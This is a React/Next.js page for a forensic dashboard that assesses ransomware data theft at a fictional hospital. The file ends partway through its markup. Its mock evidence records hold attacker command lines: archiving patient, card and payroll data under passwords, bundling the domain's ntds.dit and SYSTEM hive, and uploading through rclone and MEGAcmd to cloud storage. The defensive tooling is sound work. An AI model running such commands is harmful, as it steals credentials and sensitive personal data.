"use client";

import React, { useState } from "react";
import Link from "next/link";
import {
  FileWarning,
  ShieldAlert,
  HardDrive,
  UploadCloud,
  Layers,
  AlertTriangle,
  Search,
  Filter,
  CheckCircle2,
  XCircle,
  ExternalLink,
  Download,
  Terminal,
  Activity,
  Lock,
  Unlock,
  ShieldCheck,
  Eye,
  Flame,
  Zap,
  Globe,
  Database,
  Calendar,
  Clock,
  ArrowUpRight,
  Sparkles,
  RefreshCw,
  Server
} from "lucide-react";
import { MOCK_CASES } from "@/data/recoveryData";
import { RansomwareCase } from "@/types/recovery";

interface StagedArchiveItem {
  id: string;
  fileName: string;
  stagingDirectory: string;
  toolUsed: "7-Zip (7z.exe)" | "WinRAR (rar.exe)" | "rclone" | "MEGAcmd" | "Restic" | "PowerShell Tar";
  archiveFormat: "7z (AES-256 Encrypted Header)" | "RAR5 (Encrypted Header)" | "ZIP (Split Volume)" | "TAR.GZ";
  sizeMB: number;
  fileCount: number;
  stagingHost: string;
  discoveredTimestamp: string;
  status: "STAGED_LOCAL" | "UPLOAD_IN_PROGRESS" | "EXFILTRATED" | "QUARANTINED" | "INTERCEPTED";
  exfilCloudTarget?: string;
  commandLineEvidence: string;
  sha256: string;
  containsSensitiveData: boolean;
}

interface OutboundFlowItem {
  id: string;
  timestamp: string;
  sourceHost: string;
  sourceIp: string;
  destinationIp: string;
  destinationDomain: string;
  destinationService: "MEGA.nz" | "Dropbox API" | "MegaSync" | "Custom VPS C2" | "Wasabi Cloud" | "AnonFiles";
  protocol: string;
  port: number;
  transferredMB: number;
  transferSpeedMBs: number;
  status: "ACTIVE_BURST" | "COMPLETED" | "BLOCKED_FIREWALL" | "THROTTLED";
  threatVerdict: "CONFIRMED_EXFILTRATION" | "SUSPICIOUS_HIGH_VOLUME" | "ANOMALOUS_UPLOAD";
}

interface StagedDirectoryItem {
  id: string;
  directoryPath: string;
  serverHost: string;
  category: "HIPAA_PHI" | "PCI_DSS" | "PII" | "FINANCIAL_LEDGER" | "CORP_CREDENTIALS" | "INTELLECTUAL_PROP";
  recordCount: number;
  sizeGB: number;
  sensitivityLevel: "CRITICAL" | "HIGH" | "CONFIDENTIAL";
  stagedInArchive: boolean;
  sampleDataTypes: string[];
  regulationsTriggered: ("HIPAA OCR" | "GDPR Art. 33" | "SEC Item 1.05" | "PCI DSS §12" | "State AG Laws")[];
}

const INITIAL_STAGED_ARCHIVES: StagedArchiveItem[] = [
  {
    id: "arch-001",
    fileName: "Mercy_Patient_EHR_2026_part01.7z",
    stagingDirectory: "C:\\Windows\\Temp\\~DF8472.tmp\\",
    toolUsed: "7-Zip (7z.exe)",
    archiveFormat: "7z (AES-256 Encrypted Header)",
    sizeMB: 845000,
    fileCount: 48210,
    stagingHost: "SQL-CLINICAL-01.mercy.local",
    discoveredTimestamp: "2026-08-23 03:14:22 UTC",
    status: "EXFILTRATED",
    exfilCloudTarget: "https://gfs201n.mega.nz/upload",
    commandLineEvidence: `"C:\\Program Files\\7-Zip\\7z.exe" a -t7z -p"K8#x9$Lz!qP2" -mhe=on -mx=1 -v2g C:\\Windows\\Temp\\~DF8472.tmp\\Mercy_Patient_EHR_2026.7z D:\\EpicData\\Exports\\*`,
    sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    containsSensitiveData: true
  },
  {
    id: "arch-002",
    fileName: "Mercy_Billing_CC_Vault_Aug.rar",
    stagingDirectory: "C:\\ProgramData\\USOShared\\Logs\\",
    toolUsed: "WinRAR (rar.exe)",
    archiveFormat: "RAR5 (Encrypted Header)",
    sizeMB: 312000,
    fileCount: 14500,
    stagingHost: "APP-BILLING-02.mercy.local",
    discoveredTimestamp: "2026-08-23 03:45:10 UTC",
    status: "EXFILTRATED",
    exfilCloudTarget: "mega:mercy_backup_stage",
    commandLineEvidence: `"C:\\Windows\\Temp\\rar.exe" a -hp"W3lc0m3!2026" -m1 -r C:\\ProgramData\\USOShared\\Logs\\Mercy_Billing_CC_Vault_Aug.rar \\\\FS01\\Finance\\Patient_CreditCards\\*`,
    sha256: "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
    containsSensitiveData: true
  },
  {
    id: "arch-003",
    fileName: "AD_NTDS_SYSTEM_Hive.tar.gz",
    stagingDirectory: "C:\\Users\\Public\\Downloads\\",
    toolUsed: "PowerShell Tar",
    archiveFormat: "TAR.GZ",
    sizeMB: 4800,
    fileCount: 3,
    stagingHost: "DC01.mercy.local",
    discoveredTimestamp: "2026-08-23 04:12:05 UTC",
    status: "QUARANTINED",
    exfilCloudTarget: "185.220.101.44 (Custom VPS)",
    commandLineEvidence: `powershell.exe -Command "tar -czf C:\\Users\\Public\\Downloads\\AD_NTDS_SYSTEM_Hive.tar.gz C:\\Windows\\Temp\\ntds.dit C:\\Windows\\Temp\\SYSTEM"`,
    sha256: "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
    containsSensitiveData: true
  },
  {
    id: "arch-004",
    fileName: "Executive_Emails_2025_2026.7z",
    stagingDirectory: "D:\\ExchangeStaging\\",
    toolUsed: "rclone",
    archiveFormat: "7z (AES-256 Encrypted Header)",
    sizeMB: 654000,
    fileCount: 89000,
    stagingHost: "EXCH-01.mercy.local",
    discoveredTimestamp: "2026-08-23 04:40:19 UTC",
    status: "INTERCEPTED",
    exfilCloudTarget: "wasabi:target-bucket-4881",
    commandLineEvidence: `rclone.exe copy D:\\ExchangeStaging\\ wasabi:target-bucket-4881 --config C:\\Windows\\Temp\\rclone.conf --transfers 16 --bwlimit 50M`,
    sha256: "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb",
    containsSensitiveData: true
  },
  {
    id: "arch-005",
    fileName: "Employee_W2_Payroll_Master.7z",
    stagingDirectory: "C:\\PerfLogs\\AdminLogs\\",
    toolUsed: "MEGAcmd",
    archiveFormat: "7z (AES-256 Encrypted Header)",
    sizeMB: 18400,
    fileCount: 4200,
    stagingHost: "FS01.mercy.local",
    discoveredTimestamp: "2026-08-23 05:02:44 UTC",
    status: "EXFILTRATED",
    exfilCloudTarget: "https://mega.nz/#F!xY812",
    commandLineEvidence: `mega-put.exe C:\\PerfLogs\\AdminLogs\\Employee_W2_Payroll_Master.7z /Mercy_Dumps/`,
    sha256: "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce",
    containsSensitiveData: true
  }
];

const INITIAL_EGRESS_FLOWS: OutboundFlowItem[] = [
  {
    id: "flow-101",
    timestamp: "2026-08-23 03:20:11",
    sourceHost: "SQL-CLINICAL-01",
    sourceIp: "10.14.3.15",
    destinationIp: "31.216.148.12",
    destinationDomain: "gfs201n.mega.nz",
    destinationService: "MEGA.nz",
    protocol: "HTTPS (TLS 1.3)",
    port: 443,
    transferredMB: 845000,
    transferSpeedMBs: 85.4,
    status: "COMPLETED",
    threatVerdict: "CONFIRMED_EXFILTRATION"
  },
  {
    id: "flow-102",
    timestamp: "2026-08-23 03:52:00",
    sourceHost: "APP-BILLING-02",
    sourceIp: "10.14.3.28",
    destinationIp: "162.125.6.20",
    destinationDomain: "api.dropboxapi.com",
    destinationService: "Dropbox API",
    protocol: "HTTPS (TLS 1.3)",
    port: 443,
    transferredMB: 312000,
    transferSpeedMBs: 42.1,
    status: "COMPLETED",
    threatVerdict: "CONFIRMED_EXFILTRATION"
  },
  {
    id: "flow-103",
    timestamp: "2026-08-23 04:15:30",
    sourceHost: "DC01",
    sourceIp: "10.14.2.10",
    destinationIp: "185.220.101.44",
    destinationDomain: "tor-exit-relays.eu",
    destinationService: "Custom VPS C2",
    protocol: "TCP Raw Encrypted",
    port: 8443,
    transferredMB: 4800,
    transferSpeedMBs: 12.8,
    status: "BLOCKED_FIREWALL",
    threatVerdict: "SUSPICIOUS_HIGH_VOLUME"
  },
  {
    id: "flow-104",
    timestamp: "2026-08-23 04:45:00",
    sourceHost: "EXCH-01",
    sourceIp: "10.14.4.10",
    destinationIp: "209.58.188.102",
    destinationDomain: "s3.wasabisys.com",
    destinationService: "Wasabi Cloud",
    protocol: "HTTPS (TLS 1.3)",
    port: 443,
    transferredMB: 45000,
    transferSpeedMBs: 50.0,
    status: "BLOCKED_FIREWALL",
    threatVerdict: "CONFIRMED_EXFILTRATION"
  },
  {
    id: "flow-105",
    timestamp: "2026-08-23 05:08:12",
    sourceHost: "FS01",
    sourceIp: "10.14.5.12",
    destinationIp: "31.216.148.88",
    destinationDomain: "mega.nz",
    destinationService: "MegaSync",
    protocol: "HTTPS (TLS 1.3)",
    port: 443,
    transferredMB: 18400,
    transferSpeedMBs: 24.5,
    status: "COMPLETED",
    threatVerdict: "CONFIRMED_EXFILTRATION"
  }
];

const INITIAL_DATA_EXPOSURE: StagedDirectoryItem[] = [
  {
    id: "exp-001",
    directoryPath: "D:\\EpicData\\Exports\\Patient_Records_2026",
    serverHost: "SQL-CLINICAL-01",
    category: "HIPAA_PHI",
    recordCount: 384000,
    sizeGB: 845,
    sensitivityLevel: "CRITICAL",
    stagedInArchive: true,
    sampleDataTypes: ["Patient SSN", "Clinical Diagnosis Codes (ICD-10)", "Prescriptions", "Medical Chart Notes", "Insurance IDs"],
    regulationsTriggered: ["HIPAA OCR", "State AG Laws"]
  },
  {
    id: "exp-002",
    directoryPath: "\\\\FS01\\Finance\\Patient_CreditCards\\2025_2026",
    serverHost: "FS01.mercy.local",
    category: "PCI_DSS",
    recordCount: 78500,
    sizeGB: 312,
    sensitivityLevel: "CRITICAL",
    stagedInArchive: true,
    sampleDataTypes: ["Primary Account Number (PAN)", "Cardholder Names", "Expiration Dates", "Encrypted CVV Blobs", "Billing Addresses"],
    regulationsTriggered: ["PCI DSS §12", "SEC Item 1.05", "State AG Laws"]
  },
  {
    id: "exp-003",
    directoryPath: "C:\\PerfLogs\\AdminLogs\\Employee_W2_Payroll",
    serverHost: "FS01.mercy.local",
    category: "PII",
    recordCount: 19500,
    sizeGB: 18.4,
    sensitivityLevel: "HIGH",
    stagedInArchive: true,
    sampleDataTypes: ["Employee Full Names", "SSNs", "Direct Deposit Bank Account / Routing #", "W-2 Tax Forms", "Home Addresses"],
    regulationsTriggered: ["GDPR Art. 33", "State AG Laws", "SEC Item 1.05"]
  },
  {
    id: "exp-004",
    directoryPath: "D:\\ExchangeStaging\\Executive_Mailboxes",
    serverHost: "EXCH-01.mercy.local",
    category: "INTELLECTUAL_PROP",
    recordCount: 89000,
    sizeGB: 654,
    sensitivityLevel: "HIGH",
    stagedInArchive: true,
    sampleDataTypes: ["Board Communications", "M&A Negotiations", "Vendor Contracts", "Internal Security Audits"],
    regulationsTriggered: ["SEC Item 1.05"]
  },
  {
    id: "exp-005",
    directoryPath: "C:\\Windows\\NTDS\\ntds.dit",
    serverHost: "DC01.mercy.local",
    category: "CORP_CREDENTIALS",
    recordCount: 12400,
    sizeGB: 4.8,
    sensitivityLevel: "CRITICAL",
    stagedInArchive: false,
    sampleDataTypes: ["Active Directory Kerberos Hashes (KRBTGT)", "NTLM Hashes", "Domain Admin Credentials", "LAPS Passwords"],
    regulationsTriggered: ["SEC Item 1.05", "State AG Laws"]
  }
];

export default function ExfiltrationAssessorPage() {
  const [selectedCaseId, setSelectedCaseId] = useState("case-001");
  const [activeTab, setActiveTab] = useState<"STAGED" | "EGRESS" | "EXPOSURE" | "LEAK_MONITOR">("STAGED");
  const [stagedList, setStagedList] = useState<StagedArchiveItem[]>(INITIAL_STAGED_ARCHIVES);
  const [egressFlows, setEgressFlows] = useState<OutboundFlowItem[]>(INITIAL_EGRESS_FLOWS);
  const [selectedArchive, setSelectedArchive] = useState<StagedArchiveItem | null>(INITIAL_STAGED_ARCHIVES[0]);
  const [selectedExposure, setSelectedExposure] = useState<StagedDirectoryItem | null>(INITIAL_DATA_EXPOSURE[0]);
  const [toolFilter, setToolFilter] = useState<string>("ALL");
  const [searchQuery, setSearchQuery] = useState("");
  const [isSinkholing, setIsSinkholing] = useState(false);
  const [sinkholeStatus, setSinkholeStatus] = useState<string | null>(null);
  const [dossierExported, setDossierExported] = useState(false);

  const currentCase = MOCK_CASES.find((c) => c.id === selectedCaseId) || MOCK_CASES[0];

  const totalExfilGB = (stagedList.reduce((acc, a) => acc + (a.status === "EXFILTRATED" ? a.sizeMB : 0), 0) / 1024).toFixed(1);
  const totalStagedGB = (stagedList.reduce((acc, a) => acc + a.sizeMB, 0) / 1024).toFixed(1);
  const totalRecordsCompromised = INITIAL_DATA_EXPOSURE.filter(d => d.stagedInArchive).reduce((acc, d) => acc + d.recordCount, 0);

  const filteredArchives = stagedList.filter((item) => {
    const matchesTool = toolFilter === "ALL" || item.toolUsed.includes(toolFilter);
    const matchesSearch =
      item.fileName.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.stagingHost.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.stagingDirectory.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesTool && matchesSearch;
  });

  const handleQuarantine = (id: string) => {
    setStagedList((prev) =>
      prev.map((item) => (item.id === id ? { ...item, status: "QUARANTINED" } : item))
    );
    if (selectedArchive?.id === id) {
      setSelectedArchive((prev) => (prev ? { ...prev, status: "QUARANTINED" } : null));
    }
  };

  const handleTriggerSinkhole = () => {
    setIsSinkholing(true);
    setTimeout(() => {
      setIsSinkholing(false);
      setSinkholeStatus("Active egress sinkhole applied: Blocked 4 MEGA & Wasabi IP routes at perimeter NGFW.");
      setEgressFlows((prev) =>
        prev.map((f) =>
          f.status === "ACTIVE_BURST" ? { ...f, status: "BLOCKED_FIREWALL" } : f
        )
      );
    }, 900);
  };

  const handleExportDossier = () => {
    setDossierExported(true);
    setTimeout(() => setDossierExported(false), 4000);
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
      {/* Header Banner */}
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "flex-start",
          borderBottom: "1px solid var(--border)",
          paddingBottom: 16
        }}
      >
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
            <span
              style={{
                fontSize: 10,
                fontWeight: 800,
                padding: "2px 8px",
                borderRadius: 4,
                background: "rgba(244, 63, 94, 0.15)",
                color: "var(--rose)",
                border: "1px solid rgba(244, 63, 94, 0.3)",
                textTransform: "uppercase",
                letterSpacing: "0.08em"
              }}
            >
              Stage 5: INVESTIGATE & PRESERVE
            </span>
            <span style={{ color: "var(--muted)", fontSize: 12 }}>•</span>
            <span style={{ fontSize: 12, color: "var(--cyan)", fontWeight: 600 }}>
              Double-Extortion & Data Theft Intelligence
            </span>
          </div>
          <h1 style={{ fontSize: 22, fontWeight: 800, color: "var(--fg)", display: "flex", alignItems: "center", gap: 10 }}>
            <FileWarning size={24} color="var(--rose)" />
            Data Exfiltration & Double-Extortion Assessor
          </h1>
          <p style={{ fontSize: 13, color: "var(--muted)", marginTop: 4, maxWidth: 850 }}>
            Forensic detection of pre-encryption compression artifacts (7-Zip, WinRAR, rclone), egress NetFlow bandwidth anomalies, and sensitive data classification (PII, HIPAA PHI, PCI-DSS) to enforce statutory breach notification deadlines.
          </p>
        </div>

        {/* Case Selector */}
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end" }}>
            <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 600 }}>Active Incident:</span>
            <select
              value={selectedCaseId}
              onChange={(e) => setSelectedCaseId(e.target.value)}
              style={{
                background: "var(--surface-2)",
                color: "var(--fg)",
                border: "1px solid var(--border)",
                borderRadius: 6,
                padding: "6px 12px",
                fontSize: 12,
                fontWeight: 700,
                cursor: "pointer",
                outline: "none"
              }}
            >
              {MOCK_CASES.map((c) => (
                <option key={c.id} value={c.id}>
                  {c.caseNumber} - {c.organization} ({c.ransomwareFamily})
                </option>
              ))}
            </select>
          </div>

          <button
            onClick={handleExportDossier}
            className="btn-primary"
            style={{ height: 36, padding: "0 14px" }}
          >
            <Download size={14} />
            {dossierExported ? "Dossier Exported!" : "Export Legal Dossier"}
          </button>
        </div>
      </div>

      {/* KPI Cards Strip */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 12 }}>
        <div className="card-tactical" style={{ padding: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700 }}>EXFILTRATION STATUS</span>
            <Flame size={15} color="var(--rose)" />
          </div>
          <div style={{ fontSize: 18, fontWeight: 900, color: "var(--rose)" }}>
            {currentCase.dataExfiltrationLikelihood === "CONFIRMED" ? "CONFIRMED THEFT" : "HIGH SUSPICION"}
          </div>
          <div style={{ fontSize: 11, color: "var(--fg-2)", marginTop: 4 }}>
            Threat Actor: <span style={{ color: "var(--amber)", fontWeight: 600 }}>{currentCase.threatActor}</span>
          </div>
        </div>

        <div className="card-tactical" style={{ padding: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700 }}>CONFIRMED EXFILTRATED</span>
            <UploadCloud size={15} color="var(--rose)" />
          </div>
          <div style={{ fontSize: 18, fontWeight: 900, color: "var(--fg)" }}>
            {totalExfilGB} <span style={{ fontSize: 12, color: "var(--muted)", fontWeight: 500 }}>GB</span>
          </div>
          <div style={{ fontSize: 11, color: "var(--fg-2)", marginTop: 4 }}>
            Out of <span style={{ color: "var(--cyan)", fontWeight: 600 }}>{totalStagedGB} GB</span> staged
          </div>
        </div>

        <div className="card-tactical" style={{ padding: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700 }}>STAGED ARCHIVES</span>
            <HardDrive size={15} color="var(--cyan)" />
          </div>
          <div style={{ fontSize: 18, fontWeight: 900, color: "var(--cyan)" }}>
            {stagedList.length} <span style={{ fontSize: 12, color: "var(--muted)", fontWeight: 500 }}>Volumes</span>
          </div>
          <div style={{ fontSize: 11, color: "var(--fg-2)", marginTop: 4 }}>
            7z, WinRAR & rclone staging
          </div>
        </div>

        <div className="card-tactical" style={{ padding: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700 }}>EXPOSED RECORDS</span>
            <Database size={15} color="var(--amber)" />
          </div>
          <div style={{ fontSize: 18, fontWeight: 900, color: "var(--amber)" }}>
            {totalRecordsCompromised.toLocaleString()}
          </div>
          <div style={{ fontSize: 11, color: "var(--fg-2)", marginTop: 4 }}>
            PHI (384k), PCI (78k), PII (19k)
          </div>
        </div>

        <div className="card-tactical" style={{ padding: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "var(--muted)", fontWeight: 700 }}>DARKNET LEAK STATUS</span>
            <Globe size={15} color="var(--purple)" />
          </div>
          <div style={{ fontSize: 18, fontWeight: 900, color: "var(--purple)" }}>
            AUCTION ACTIVE
          </div>
          <div style={{ fontSize: 11, color: "var(--fg-2)", marginTop: 4 }}>
            72h Extortion Clock Ticking
          </div>
        </div>
      </div>

      {sinkholeStatus && (
        <div
          style={{
            background: "rgba(16, 185, 129, 0.12)",
            border: "1px solid rgba(16, 185, 129, 0.4)",
            borderRadius: 6,
            padding: "10px 14px",
            fontSize: 12,
            color: "var(--primary)",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between"
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <CheckCircle2 size={16} />
            <span>{sinkholeStatus}</span>
          </div>
          <button
            onClick={() => setSinkholeStatus(null)}
            style={{ background: "transparent", border: "none", color: "var(--muted)", cursor: "pointer", fontSize: 11 }}
          >
            Dismiss
          </button>
        </div>
      )}

      {/* Tabs Navigation */}
      <div style={{ display: "flex", gap: 8, borderBottom: "1px solid var(--border)", paddingBottom: 6 }}>
        <button
          onClick={() => setActiveTab("STAGED")}
          style={{
            background: activeTab === "STAGED" ? "var(--surface-2)" : "transparent",
            color: activeTab === "STAGED" ? "var(--cyan)" : "var(--fg-2)",
            border: activeTab === "STAGED" ? "1px solid var(--cyan)" : "1px solid transparent",
            borderRadius: "6px 6px 0 0",
            padding: "8px 16px",
            fontSize: 13,
            fontWeight: 700,
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            gap: 8
          }}
        >
          <HardDrive size={15} />
          Staged Archive Artifacts ({stagedList.length})
        </button>

        <button
          onClick={() => setActiveTab("EGRESS")}
          style={{
            background: activeTab === "EGRESS" ? "var(--surface-2)" : "transparent",
            color: activeTab === "EGRESS" ? "var(--rose)" : "var(--fg-2)",
            border: activeTab === "EGRESS" ? "1px solid var(--rose)" : "1px solid transparent",
            borderRadius: "6px 6px 0 0",
            padding: "8px 16px",
            fontSize: 13,
            fontWeight: 700,
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            gap: 8
          }}
        >
          <UploadCloud size={15} />
          Outbound NetFlow & Cloud Egress ({egressFlows.length})
        </button>

        <button
          onClick={() => setActiveTab("EXPOSURE")}
          style={{
            background: activeTab === "EXPOSURE" ? "var(--surface-2)" : "transparent",
            color: activeTab === "EXPOSURE" ? "var(--amber)" : "var(--fg-2)",
            border: activeTab === "EXPOSURE" ? "1px solid var(--amber)" : "1px solid transparent",
            borderRadius: "6px 6px 0 0",
            padding: "8px 16px",
            fontSize: 13,
            fontWeight: 700,
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            gap: 8
          }}
        >
          <Database size={15} />
          Data Exposure & Regulatory Classification
        </button>

        <button
          onClick={() => setActiveTab("LEAK_MONITOR")}
          style={{
            background: activeTab === "LEAK_MONITOR" ? "var(--surface-2)" : "transparent",
            color: activeTab === "LEAK_MONITOR" ? "var(--purple)" : "var(--fg-2)",
            border: activeTab === "LEAK_MONITOR" ? "1px solid var(--purple)" : "1px solid transparent",
            borderRadius: "6px 6px 0 0",
            padding: "8px 16px",
            fontSize: 13,
            fontWeight: 700,
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            gap: 8
          }}
        >
          <Globe size={15} />
          Darknet Leak Site & Proof Verification
        </button>
      </div>

      {/* TAB 1: STAGED ARCHIVE DETECTOR */}
      {activeTab === "STAGED" && (
        <div style={{ display: "grid", gridTemplateColumns: "1.4fr 1fr", gap: 16 }}>
          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            {/* Filters Bar */}
            <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
              <div style={{ position: "relative", flex: 1 }}>
                <Search size={14} color="var(--muted)" style={{ position: "absolute", left: 10, top: 10 }} />
                <input
                  type="text"
                  placeholder="Filter by archive name, host, or path..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  style={{
                    width: "100%",
                    padding: "7px 10px 7px 32px",
                    background: "var(--surface-2)",
                    border: "1px solid var(--border)",
                    borderRadius: 6,
                    color: "var(--fg)",
                    fontSize: 12,
                    outline: "none"
                  }}
                />
              </div>

              <select
                value={toolFilter}
                onChange={(e) => setToolFilter(e.target.value)}
                style={{
                  background: "var(--surface-2)",
                  color: "var(--fg)",
                  border: "1px solid var(--border)",
                  borderRadius: 6,
                  padding: "7px 10px",
                  fontSize: 12,
                  fontWeight: 600,
                  outline: "none"
                }}
              >
                <option value="ALL">All Tools ({stagedList.length})</option>
                <option value="7-Zip">7-Zip (7z.exe)</option>
                <option value="WinRAR">WinRAR (rar.exe)</option>
                <option value="rclone">rclone</option>
                <option value="MEGA">MEGAcmd</option>
                <option value="PowerShell">PowerShell Tar</option>
              </select>
            </div>

            {/* Staged Archives Table */}
            <div className="card-tactical" style={{ overflow: "hidden" }}>
              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                <thead>
                  <tr style={{ background: "var(--surface-2)", borderBottom: "1px solid var(--border)" }}>
                    <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>ARCHIVE FILE & HOST</th>
                    <th style={{ textAlign: "left", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>TOOL & FORMAT</th>
                    <th style={{ textAlign: "right", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>SIZE</th>
                    <th style={{ textAlign: "center", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>STATUS</th>
                    <th style={{ textAlign: "right", padding: "10px 12px", color: "var(--muted)", fontWeight: 700 }}>ACTION</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredArchives.map((arch) => {
                    const isSelected = selectedArchive?.id === arch.id;
                    const isExfil = arch.status === "EXFILTRATED";
                    const isQuar = arch.status === "QUARANTINED";
                    const isIntercept = arch.status === "INTERCEPTED";

                    return (
                      <tr
                        key={arch.id}
                        onClick={() => setSelectedArchive(arch)}
                        style={{
                          borderBottom: "1px solid var(--border-subtle)",
                          background: isSelected ? "rgba(6, 182, 212, 0.08)" : "transparent",
                          cursor: "pointer",
                          transition: "background 0.1s ease"
                        }}
                      >
                        <td style={{ padding: "10px 12px" }}>
                          <div style={{ fontWeight: 700, color: isSelected ? "var(--cyan)" : "var(--fg)" }}>
                            {arch.fileName}
                          </div>
                          <div style={{ fontSize: 10, color: "var(--muted)", fontFamily: "monospace" }}>
                            {arch.stagingHost}
                          </div>
                        </td>
                        <td style={{ padding: "10px 12px" }}>
                          <div style={{ color: "var(--fg-2)", fontWeight: 600 }}>{arch.toolUsed}</div>
                          <div style={{ fontSize: 10, color: "var(--muted)" }}>{arch.archiveFormat}</div>
                        </td>
                        <td style={{ padding: "10px 12px", textAlign: "right" }}>
                          <div style={{ fontWeight: 700, color: "var(--fg)" }}>
                            {(arch.sizeMB / 1024).toFixed(2)} GB
                          </div>
                          <div style={{ fontSize: 10, color: "var(--muted)" }}>{arch.fileCount.toLocaleString()} files</div>
                        </td>
                        <td style={{ padding: "10px 12px", textAlign: "center" }}>
                          <span
                            style={{
                              fontSize: 9.5,
                              fontWeight: 800,
                              padding: "2px 7px",
                              borderRadius: 4,
                              background: isExfil
                                ? "rgba(244, 63, 94, 0.15)"
                                : isQuar
                                ? "rgba(16, 185, 129, 0.15)"
                                : isIntercept
                                ? "rgba(245, 158, 11, 0.15)"
                                : "rgba(6, 182, 212, 0.15)",
                              color: isExfil
                                ? "var(--rose)"
                                : isQuar
                                ? "var(--primary)"
                                : isIntercept
                                ? "var(--amber)"
                                : "var(--cyan)",
                              border: `1px solid ${
                                isExfil
                                  ? "rgba(244, 63, 94, 0.3)"
                                  : isQuar
                                  ? "rgba(16, 185, 129, 0.3)"
                                  : "rgba(245, 158, 11, 0.3)"
                              }`
                            }}
                          >
                            {arch.status}
                          </span>
                        </td>
                        <td style={{ padding: "10px 12px", textAlign: "right" }}>
                          {arch.status !== "QUARANTINED" && (
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleQuarantine(arch.id);
                              }}
                              style={{
                                background: "var(--surface-3)",
                                color: "var(--rose)",
                                border: "1px solid rgba(244, 63, 94, 0.3)",
                                borderRadius: 4,
                                padding: "4px 8px",
                                fontSize: 10,
                                fontWeight: 700,
                                cursor: "pointer"
                              }}
                            >
                              Quarantine
                            </button>
                          )}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

          {/* Staged Detail Panel */}
          {selectedArchive && (
            <div className="card-tactical" style={{ padding: 16, display: "flex", flexDirection: "column", gap: 14 }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", borderBottom: "1px solid var(--border)", paddingBottom: 10 }}>
                <div>
                  <span style={{ fontSize: 10, color: "var(--muted)", fontWeight: 700 }}>ARCHIVE FORENSIC INSPECTOR</span>
                  <h3 style={{ fontSize: 15, fontWeight: 800, color: "var(--cyan)", marginTop: 2 }}>
                    {selectedArchive.fileName}
                  </h3>
                </div>
                <span
                  style={{
                    fontSize: 10,
                    fontWeight: 800,
                    padding: "3px 8px",
                    borderRadius: 4,
                    background: selectedArchive.status === "EXFILTRATED" ? "rgba(244, 63, 94, 0.15)" : "rgba(16, 185, 129, 0.15)",
                    color: selectedArchive.status === "EXFILTRATED" ? "var(--rose)" : "var(--primary)",
                    border: "1px solid var(--border)"
                  }}
                >
                  {selectedArchive.status}
                </span>
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, fontSize: 11 }}>
                <div style={{ background: "var(--surface-2)", padding: 8, borderRadius: 6 }}>
                  <div style={{ color: "var(--muted)" }}>Staging Host:</div>
                  <div style={{ fontWeight: 700, color: "var(--fg)", marginTop: 2 }}>{selectedArchive.stagingHost}</div>
                </div>

                <div style={{ background: "var(--surface-2)", padding: 8, borderRadius: 6 }}>
                  <div style={{ color: "var(--muted)" }}>Discovered:</div>
                  <div style={{ fontWeight: 700, color: "var(--fg)", marginTop: 2 }}>{selectedArchive.discoveredTimestamp}</div>
                </div>

                <div style={{ background: "var(--surface-2)", padding: 8, borderRadius: 6 }}>
                  <div style={{ color: "var(--muted)" }}>Total Payload:</div>
                  <div style={{ fontWeight: 700, color: "var(--fg)", marginTop: 2 }}>{(selectedArchive.sizeMB / 1024).toFixed(2)} GB ({selectedArchive.fileCount.toLocaleString()} files)</div>
                </div>

                <div style={{ background: "var(--surface-2)", padding: 8, borderRadius: 6 }}>
                  <div style={{ color: "var(--muted)" }}>Exfil Destination:</div>
                  <div style={{ fontWeight: 700, color: "var(--amber)", marginTop: 2 }}>{selectedArchive.exfilCloudTarget || "N/A"}</div>
                </div>
              </div>

              <div>
